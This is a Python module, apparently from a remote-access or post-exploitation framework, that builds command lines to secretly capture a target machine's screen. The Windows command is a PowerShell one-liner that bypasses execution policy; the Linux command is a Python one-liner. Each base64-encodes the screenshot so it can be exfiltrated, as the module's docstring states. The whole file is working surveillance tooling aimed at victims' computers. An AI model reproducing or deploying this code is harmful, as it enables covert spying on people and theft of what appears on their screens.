"""
modules/screenshot.py — Remote Screenshot Module

Generates a PowerShell or Python one-liner to capture the target's
screen, encode it as base64, and print it for exfiltration.
"""

MODULE_INFO = {
    "name": "screenshot",
    "description": "Capture a screenshot on the target (Win PS / Linux Python)",
    "author": "Hider",
    "platform": "all",
}


def run(session, args):
    os_type = "windows"
    if session and isinstance(session, dict):
        os_type = session.get("os", "windows").lower()

    if "linux" in os_type:
        return _linux_cmd()
    return _windows_cmd()


def _windows_cmd():
    return (
        "powershell -ep bypass -c \""
        "Add-Type -AssemblyName System.Windows.Forms;"
        "$bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,"
        "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);"
        "$g = [Drawing.Graphics]::FromImage($bmp);"
        "$g.CopyFromScreen((New-Object Drawing.Point(0,0)),(New-Object Drawing.Point(0,0)),$bmp.Size);"
        "$ms = New-Object IO.MemoryStream;"
        "$bmp.Save($ms,[Drawing.Imaging.ImageFormat]::Png);"
        "[Convert]::ToBase64String($ms.ToArray())"
        "\""
    )


def _linux_cmd():
    return (
        "python3 -c \""
        "import subprocess,base64,tempfile,os;"
        "p=tempfile.mktemp(suffix='.png');"
        "subprocess.run(['import','-window','root',p],check=True);"
        "print(base64.b64encode(open(p,'rb').read()).decode());"
        "os.unlink(p)"
        "\""
    )
